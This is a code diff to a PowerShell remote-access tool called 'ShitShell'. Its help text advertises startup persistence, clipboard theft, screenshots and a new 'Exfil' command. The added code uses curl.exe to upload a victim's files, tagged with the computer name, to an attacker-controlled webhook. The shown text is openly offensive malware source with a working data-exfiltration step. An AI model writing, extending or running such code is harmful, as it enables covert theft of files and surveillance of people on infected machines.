@@ -19,7 +19,8 @@ $jsonPayload = @{
                           "`n:arrow_forward: AddPersistance: Runs script on startup." +
                           "`n:arrow_forward: RemovePersistance: Removes persistance. " +
                           "`n:arrow_forward: GetClipboard: Sends clipboard content to your webhook." +
-                          "`n:arrow_forward: TakeScreenshot: Sends a screenshot to your webhook."
+                          "`n:arrow_forward: TakeScreenshot: Sends a screenshot to your webhook." +
+                          "`n:arrow_forward: Exfil: Given a path, this function will exfiltrate data to your webhook."
             color       = 16711680
             author      = @{
                 name     = "ShitShell"
@@ -206,6 +207,10 @@ function Exfil {
         Compress-Archive $Data -DestinationPath $ExfilTemp  -CompressionLevel Fastest
         curl.exe -F "file1=@$ExfilTemp" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":floppy_disk:ExfilData:\"}"' $hookurl | Out-Null
         Remove-Item $ExfilTemp -Force
+
+    }else{
+
+        curl.exe -F "file1=@$Data" -F '"payload_json={\"username\": \"'($env:COMPUTERNAME)'\",\"content\": \":floppy_disk:ExfilData:\"}"' $hookurl | Out-Null
 
     }
     
